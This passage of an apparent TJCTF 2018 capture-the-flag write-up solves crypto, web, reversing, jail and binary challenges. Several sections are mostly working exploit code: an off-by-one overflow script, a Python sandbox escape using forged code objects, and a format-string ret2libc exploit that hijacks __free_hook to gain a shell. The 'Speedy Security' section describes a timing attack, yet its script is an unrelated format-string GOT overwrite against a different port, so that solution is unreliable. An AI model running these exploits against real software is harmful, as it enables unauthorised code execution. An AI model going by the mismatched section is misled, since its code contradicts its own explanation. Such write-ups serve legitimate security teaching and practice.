print crack('473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554')
print d('473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554', '3V@mK<aa')

# got keyLength = 8

for a in string.printable:
  for b in string.printable:
    flag = d('473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554', '3V@mK<'+a+b)
    if flag[-1] == '}':
      print flag
```

Flag: `tjctf{m4ybe_Wr1t3ing_mY_3ncRypT10N_MY5elf_W4Snt_v_sm4R7}`

# Request Me - Web

## Problem

Written by okulkarni

https://request_me.tjctf.org/

## Solution

This question is about http methods.

```python
from requests.auth import HTTPBasicAuth
import requests

print requests.options('https://request_me.tjctf.org/').text

print requests.put('https://request_me.tjctf.org/', data = {'username':'abcde', 'password':'abcde'}).text

print requests.post('https://request_me.tjctf.org/', auth=HTTPBasicAuth('abcde', 'abcde')).text

print requests.delete('https://request_me.tjctf.org/', auth=HTTPBasicAuth('abcde', 'abcde')).text
```

```
❯ python main.py
GET, POST, PUT, DELETE, OPTIONS
Parameters: username, password
Some methods require HTTP Basic Auth
I stole your credentials!
Maybe you should take your credentials back?
Finally! The flag is tjctf{wHy_4re_th3r3_s0_m4ny_Opt10nS}
```

Flag: `tjctf{wHy_4re_th3r3_s0_m4ny_Opt10nS}`

# Python Reversing - Reverse Engineering

## Problem

Written by jfrucht25

Found this flag checking file and it is quite vulnerable

[Source](/blog/tjctf-2018-writeup/Python Reversing/source.py)

## Solution

```python

from itertools import *
import numpy as np

def decode(message):
  lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])]
  for l in combinations([x for x in range(19, 25)], 0):
    counter = 19
    index = 0
    arr = [304, 189, 161, 133, 7, 169, 291, 382, 143, 341, 1, 131, 366, 23, 427, 370, 134, 428, 161]
    isGood = True
    while counter < 25:
      if counter in l:
        if message[index:index+9][0] == '0':
          isGood = False
        arr.append(int(message[index:index+9], 2))
        index += 9
      else:
        arr.append(int(message[index:index+8], 2))
        index += 8
      counter += 1
    # if not isGood:
    #   break
    # print l
    print(arr)
    arr = [j^lmao[i] for i , j in enumerate(arr)]
    # print(arr)
    np.random.seed(12345)
    arr = np.array(arr)
    other = np.random.randint(1,5,(len(arr)))
    arr = np.divide(arr, other).tolist()
    print ''.join([chr(x) for x in arr])

  # splitCipher = lambda A, n: [A[i:i+n] for i in range(0, len(A), n)]
  # chars = splitCipher(message, 8)
  # print chars

decode('100010001010101001100001110110100110011101')
```

Flag: `tjctf{pYth0n_1s_tr1v14l}`

# Tilted Troop - Binary Exploitation

## Problem

Written by dwiz24

Can you help us defeat the monster? [binary](/blog/tjctf-2018-writeup/Tilted Troop/strover) ([source](/blog/tjctf-2018-writeup/Tilted Troop/strover.c))

## Solution

The problem used a mix of `<`, and `<=` allowing us to create 9 team although the `MAX_TEAM_SIZE` is 8, and because `strength` pointer is directly below `names` pointers, the last team's name pointer overrides the strength pointer allowing us to have full control over the strength attribute.

```c
struct team {
    char* names[MAX_TEAM_SIZE];
    char* strength;
    int teamSize;
} typedef team;
```

```python
from pwn import *

context.log_level = 'debug'
context.binary = './strover'

# sh = process('./strover')
sh = remote('problem1.tjctf.org', 8002)

print sh.recvuntil('Quit\n')

payload = 'bbbj'

for i in range(9):
  sh.sendline('A '+payload)
sh.sendline('F')


sh.interactive()
```

Flag: `tjctf{0oPs_CoMP4Ri5ONs_r_h4rD}`

# Caesar's Complication - Cryptography

## Problem

Written by evanyeyeye

King Julius Caesar was infamous for his [wordsearch](/blog/tjctf-2018-writeup/Caesar's Complication/puzzle) solving speed.

## Solution

This question is an interesting combination of `wordsearch` and the `Caesar cipher`.

```python
# from https://github.com/robbiebarrat/word-search/blob/master/wordsearch.py

solutions = ['tjctf{']
puzzle = open('./puzzle').read().strip()

s = 'abcdefghijklmnopqrstuvwxyz'

for i in range(len(s)):
  temp = ''
  for e in puzzle:
    if e in '{}\n':
      temp += e
    else:
      temp += s[(s.find(e)+1)%len(s)]
  puzzle = temp
  print i

  wordgrid = puzzle.replace(' ','')

  # Computers start counting at zero, so...
  length = wordgrid.index('\n')+1

  characters = [(letter, divmod(index, length))
              for  index, letter in enumerate (wordgrid)]

  wordlines = {}
  # These next lines just  directions so you can tell which direction the word is going
  directions = {'going downwards':0, 'going downwards and left diagonally':-1, 'going downwards and right diagonally':1}

  for word_direction, directions in directions.items():
    wordlines[word_direction] = []
    for x in range(length):
      for i in range(x, len(characters), length + directions):
        wordlines[word_direction].append(characters[i])
      wordlines[word_direction].append('\n')

  # Nice neat way of doing reversed directions.
  wordlines['going right'] = characters
  wordlines['going left'] = [i for i in reversed(characters)]
  wordlines['going upwards'] = [i for i in reversed(wordlines['going downwards'])]
  wordlines['going upwards and left diagonally'] = [i for i in reversed(wordlines['going downwards and right diagonally'])]
  wordlines['going upwards and right diagonally'] = [i for i in reversed(wordlines['going downwards and left diagonally'])]


  def printitout(direction, tuple, lines):
    print "Keep in mind, rows are horizontal and columns are vertical.\n"
    for direction, tuple in lines.items():
      string = ''.join([i[0] for i in tuple])
      for word in solutions:
        if word in string:
          coordinates = tuple[string.index(word)][1]
          print word, 'is at row', coordinates[0]+1, 'and column', coordinates[1]+1, direction + "."
          y = coordinates[0]
          x = coordinates[1]
          f = ''
          while y >= 0 and x < 100:
            f += puzzle.split('\n')[y][x]
            x += 1
            y -= 1
          print f
  printitout(word_direction, tuple, wordlines)
```

Flag: `tjctf{idesofmarch}`

# The Abyss - Miscellaneous

## Problem

Written by nthistle

If you stare into the abyss, the abyss stares back.

`nc problem1.tjctf.org 8006`

## Solution

This is another python jail problem similiar to `Mirror Mirror`. The difference is this time there is no existing function, and all the useful functions such as `input`, `open` are removed from the `builtins`.

I was stuck on the problem for a long time until I looked into python [code objects](https://stackoverflow.com/questions/5768684/what-is-a-python-code-object).

Here are a few of the reference articles that helped me along the way:

* [Bypassing a python sandbox by abusing code objects](http://pbiernat.blogspot.com/2014/09/bypassing-python-sandbox-by-abusing.html)
* [How to patch Python bytecode](https://rushter.com/blog/python-bytecode-patch/)
* [【VULNERABLITY】python sandbox escape](https://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/)
* [Python Sandbox Excape](http://blog.orleven.com/2016/10/27/python-sandbox-excape/)

**Step one: helper scripts**

I want a fast way of testing my code on the server, so I decided to write a helper script that takes the content of a python file and feed it line by line to the sevrer.

```python
from pwn import *

with open('./exploit.py') as e:
  code = e.read().strip().split('\n')

sh = remote('problem1.tjctf.org', 8006)

for line in code:
  sh.sendlineafter('>>> ', line)
sh.interactive()
```

**Step two: the exploit**

Now, we can work on the accual exploit script. Our goal is to obtain a copy of the `file` object that allows us to read the flag.

One method is to call `().__class__.__base__.__subclasses__()[40]`; however, the server prevents us from accessing anything related to `__`.

This is when python code objects comes in. We will build a function that returns the object:

```python
def f():
  return ().__class__.__base__.__subclasses__()
```

and get all the info about the byte codes of the function:

```python
print f.func_code.co_argcount
print f.func_code.co_nlocals
print f.func_code.co_stacksize
print f.func_code.co_flags
print f.func_code.co_consts
print f.func_code.co_names
print f.func_code.co_varnames
print f.func_code.co_filename
print f.func_code.co_name
print f.func_code.co_firstlineno
print f.func_code.co_lnotab
print f.func_code.co_freevars
print f.func_code.co_cellvars
```

Now using [this](https://raw.githubusercontent.com/d4em0n/nostr/master/obfuscate_str.py) handy tool, we get a string that contain `__` which bypasses the string restriction:

```python
a=((()>[])+(()>[]));aa=(((a<<a)<<a)*a);u=('c%'[::(({}>[])-(()>[]))])*a%((aa+(((a<<a)*a)+((a<<a)+((a*a)+(a+(()>[])))))),(aa+(((a<<a)*a)+((a<<a)+((a*a)+(a+(()>[])))))))
```

add a few helper varibles, and we are done:

```python
builtins_str = globals().keys()[0]

def f(x): print x

f('a')
code = type(f.func_code)
function = type(f)

mydict = {}
mydict[builtins_str] = globals()[builtins_str]

a=((()>[])+(()>[]));aa=(((a<<a)<<a)*a);u=('c%'[::(({}>[])-(()>[]))])*a%((aa+(((a<<a)*a)+((a<<a)+((a*a)+(a+(()>[])))))),(aa+(((a<<a)*a)+((a<<a)+((a*a)+(a+(()>[])))))))
codeobj = code(0, 0, 1, 67, 'd\x01\x00j\x00\x00j\x01\x00j\x02\x00\x83\x00\x00S', (None, ()), (u+'class'+u, u+'base'+u, u+'subclasses'+u), (), 'noname', '<module>', 1, '', (), ()) 

pwn = function(codeobj, mydict, None, None, None)
pwn()
```

Flag: `tjctf{h3y_n0w_1Ts_d4Rk_d0Wn_H3re}`

# Super Secure Secrets - Binary Exploitation

## Problem

Written by evanyeyeye

I humbly present to you -- Super Secure Secrets! Never before has there been a secret storing service so uncrackable. If you so desire, you can download our free trial [here](/blog/tjctf-2018-writeup/Super Secure Secrets/super_secure).

DISCLAIMER: We are in no way affiliated with Secure Secrets. In addition, any rumors you may have heard about our service being illegitimate are false and defamatory.

## Solution

This is the sequel to `Secure Secrets`, and just like the last one, there's a format string vulnerablity.

The difference, however, is that there's not `get_secret` method this time and we need to get ourself a shell.

Because NX is enabled, shellcode is nearly impossible:

```
> r2 ./super_secure
[0x00400880]> i~nx
nx       true
```

We have to do `ret2libc` instead.

The exploit consist of three stages:

1. allow us to print mutliple different messages
2. leak the libc base address
3. call one_gadget and get shell

Here are a few important steps in the process:

**Where to get a shell? - one_gadget**

one_gadget is a cool tool that does one thing: find shells in a binary library. There is the output of running the command:

```
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

**How to call the address? - free_hook and malloc**

Because `printf` utilizes `malloc` and `free`, we can trigger a `free` call just by doing `'%65537c'`.

And we can overwrite `__free_hook` to listen to `free` calls, therefore, invoke our own function.

Read [this](https://github.com/Naetw/CTF-pwn-tips#hijack-hook-function) for more info.

Full code:

```python
from pwn import *

# context.log_level = 'debug'
context.binary = './super_secure'

sh = process('./super_secure')
# sh = remote('problem1.tjctf.org', 8009)


def send_payload(payload, p=False):
  sh.sendlineafter('> ', 's')
  sh.sendlineafter(':\n', '123')
  sh.sendlineafter(':\n', payload)
  sh.sendlineafter('> ', 'v')
  sh.sendlineafter(':\n', '123')
  if p:
    sh.recvuntil('====================\n')
    out = sh.recvuntil('====================\n').split('\n')[0]
    print out
  sh.sendline('')
  if p:
    return out

memset_got = 0x00602050
strcmp_got = 0x00602070

secure_service = 0x00400da0

# stage 1: make it loop

stage1 = '%{}x'.format(secure_service)
stage1 += '%28$n  '
stage1 += p64(memset_got)

send_payload(stage1)

# stage 2: leak libc

# for i in range(1, 50):
#   send_payload('%{}$llx'.format(i), True)

output = int(send_payload('%1$llx', True), 16)
system_c = output - 3789731
lib_c_base = system_c - 0x0004f440
pwn_adrr = lib_c_base + 0x10a38c
free_hook = lib_c_base + 0x001ed8e8 + 0x200000

print hex(lib_c_base)
print hex(pwn_adrr)
print hex(free_hook)

pause()

# stage 3: pwn
goal = hex(pwn_adrr+0x10000000000000000)[3:]
for i in range(len(goal), 4, -4):
  stage3 = '%{}x'.format(int(goal[i-4:i], 16))
  l = len(stage3)
  stage3 += '%28$n'.ljust(16-l)
  stage3 += p64(free_hook+(16-i)/2)
  send_payload(stage3, True)

send_payload('%65537c')

sh.interactive()
```

Flag: `tjctf{4r3_f0rm47_57r1n65_63771n6_0ld_y37?}`

# Speedy Security - Miscellaneous

## Problem

Written by nthistle

I hear there's a flag hiding behind this new service, Speedy Security(TM). Can you find it?

`nc problem1.tjctf.org 8003`

## Solution

```
$ nc problem1.tjctf.org 8003
Welcome to Speedy Security(TM), where we'll check your password as much as you like, for added security!
How many times would you like us to check each character of your password?
100
Please enter your password:
abcde
Authorization failed!
```

Looking at this problem, I quickly realized that it vulnerable to a timing attack.

If you have 2 correct characters, it is going to take longer than if you only have 1 correct character; therefore, we can guess the password one character at a time.

```python
from pwn import *

# context.log_level = 'debug'
context.binary = './secure'

# sh = process('./secure')
sh = remote('problem1.tjctf.org', 8008)

secret_addr = 0x08048713
puts_got = 0x0804a028

payload = p32(puts_got)
payload += p32(puts_got+2)
payload += '%35$34571x'
payload += '%35$n'
payload += '%36$33009x'
payload += '%36$n'
payload += '\n'

sh.sendafter('> ', '12345\n')
sh.sendafter('> ', payload)
sh.sendafter('> ', '12345\n')
sh.interactive()
```

Special note:

> Because the network is super slow, I rented a digitalocean server for about an hour to run the script which makes the whole process 10 times faster

Flag: `tjctf{n1c3_j0b_y0u_r34lly_GOT_m3_600d}`